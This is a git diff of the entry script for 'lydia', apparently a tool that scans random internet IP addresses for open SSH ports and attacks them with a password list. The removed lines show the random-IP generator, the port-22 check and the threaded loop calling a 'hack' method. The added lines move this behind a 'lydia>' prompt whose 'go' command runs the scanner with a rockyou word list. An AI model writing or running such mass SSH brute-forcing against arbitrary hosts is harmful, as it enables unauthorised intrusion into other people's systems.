@@ -1,35 +1,9 @@
 #!/usr/bin/env python
 from tabnanny import verbose
-from lydia import Lydia
-from random import randint
-import socket
-import _thread
-import time
 from termcolor import colored
-import sys
 from argparse import ArgumentParser
-from PySide6.QtWidgets import (QLineEdit, QPushButton, QApplication,
-    QVBoxLayout, QDialog)
-
-class Form(QDialog):
-
-    def __init__(self, parent=None):
-        super(Form, self).__init__(parent)
-        # Create widgets
-        self.edit = QLineEdit("Write my name here")
-        self.button = QPushButton("Show Greetings")
-        # Create layout and add widgets
-        layout = QVBoxLayout()
-        layout.addWidget(self.edit)
-        layout.addWidget(self.button)
-        # Set dialog layout
-        self.setLayout(layout)
-        # Add button signal to greetings slot
-        self.button.clicked.connect(self.greetings)
-
-    # Greets the user
-    def greetings(self):
-        print(f"Hello {self.edit.text()}")
+from core.scanner import LydiaScanner
+from datetime import datetime
 
 parser = ArgumentParser()
 parser.add_argument("-p", "--passwordlist", dest="pwlist",
@@ -63,64 +37,50 @@ print("=========================================================================
 print("=                     Made Sten (Gespel) Heimbrodt [@Sten_Heimbrodt]                              =")
 print("===================================================================================================")
 
-
-
-
 args = parser.parse_args()
 verbose = args.verb
-if(args.gui):
-    # Create the Qt Application
-    app = QApplication(sys.argv)
-    # Create and show the form
-    form = Form()
-    form.show()
-    # Run the main Qt loop
-    sys.exit(app.exec())
-if(args.pwlist == None):
+
+
+
+
+
+
+
+def parseCommand(command, passlistpath, logfilepath):
+    basecommand = command[0]
+    if basecommand == "go":
+        s = LydiaScanner(True, passlistpath, logfilepath)
+        s.go(32)
+
+
+def menuLoop():
+    while True:
+        print(colored("lydia> ", "green"), end="")
+        inarr = input().split(" ")
+        current_date = datetime.now().strftime("%Y-%m-%d")
+        logfile_name = f"logfile_{current_date}.txt"
+        parseCommand(inarr, "rockyoufirst.txt", logfile_name)
+
+
+if (args.pwlist == None and args.logfile == None and args.threadcount == None):
+    menuLoop()
+
+if (args.pwlist == None):
     print("No passwordlist defined!")
     exit()
 passlistpath = args.pwlist
-if(args.logfile == None):
+if (args.logfile == None):
     print("No logfilepath defined. Using default logs.txt")
     logfilepath = "log.txt"
 else:
     logfilepath = args.logfile
-if(args.threadcount == None):
+if (args.threadcount == None):
     print("No threadcount given. Defaulting to 4 threads...")
     threads = 4
 else:
     threads = int(args.threadcount)
 
-def generateIp():
-    return str(randint(1, 255)) + "." + str(randint(1, 255)) + "." + str(randint(1, 255)) + "." + str(randint(1, 255))
 
-def checkForSSH(ip):
-    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    a_socket.settimeout(3)
-    location = (ip, 22)
-    result_of_check = a_socket.connect_ex(location)
-    a_socket.close()
 
-    if result_of_check == 0:
-        return True
-    else:
-        return False
 
-def go(threadnr):
-    while True:
-        ip = generateIp()
-        if(verbose == True):
-            print("[" + colored("Thread " + threadnr, "red") + "][" + colored("INFO", "cyan") + "] Checking wether " + ip + " has open port 22")
-        if(checkForSSH(ip) == True):
-            l = Lydia(ip, threadnr, passlistpath, logfilepath)
-            l.hack()
 
-if __name__ == "__main__":
-    for i in range(0, threads):
-        try:
-            _thread.start_new_thread(go, (str(i),))
-        except Exception as e:
-            print("Error: unable to start thread " + str(i))
-            print(e)
-    while(True):
-       pass
